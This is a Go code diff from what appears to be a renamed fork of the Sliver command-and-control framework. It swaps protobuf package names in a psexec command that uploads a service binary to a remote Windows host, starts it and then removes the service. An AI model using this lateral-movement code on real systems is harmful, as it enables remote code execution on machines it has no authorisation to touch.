@@ -32,7 +32,7 @@ import (
 	"github.com/starkzarn/glod/client/console"
 	"github.com/starkzarn/glod/protobuf/clientpb"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 	"github.com/starkzarn/glod/server/codenames"
 	"github.com/starkzarn/glod/util/encoders"
 	"github.com/desertbit/grumble"
@@ -109,7 +109,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	// upload to remote target
 	uploadCtrl := make(chan bool)
 	con.SpinUntil("Uploading service binary ...", uploadCtrl)
-	upload, err := con.Rpc.Upload(context.Background(), &sliverpb.UploadReq{
+	upload, err := con.Rpc.Upload(context.Background(), &glodpb.UploadReq{
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
@@ -133,7 +133,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	binaryPath := fmt.Sprintf(`%s\%s.exe`, binPath, filename)
 	serviceCtrl := make(chan bool)
 	con.SpinUntil("Starting service ...", serviceCtrl)
-	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
+	start, err := con.Rpc.StartService(context.Background(), &glodpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
 		Request:            con.ActiveTarget.Request(ctx),
@@ -154,8 +154,8 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	con.PrintInfof("Successfully started service on %s (%s)\n", hostname, binaryPath)
 	removeChan := make(chan bool)
 	con.SpinUntil("Removing service ...", removeChan)
-	removed, err := con.Rpc.RemoveService(context.Background(), &sliverpb.RemoveServiceReq{
-		ServiceInfo: &sliverpb.ServiceInfoReq{
+	removed, err := con.Rpc.RemoveService(context.Background(), &glodpb.RemoveServiceReq{
+		ServiceInfo: &glodpb.ServiceInfoReq{
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
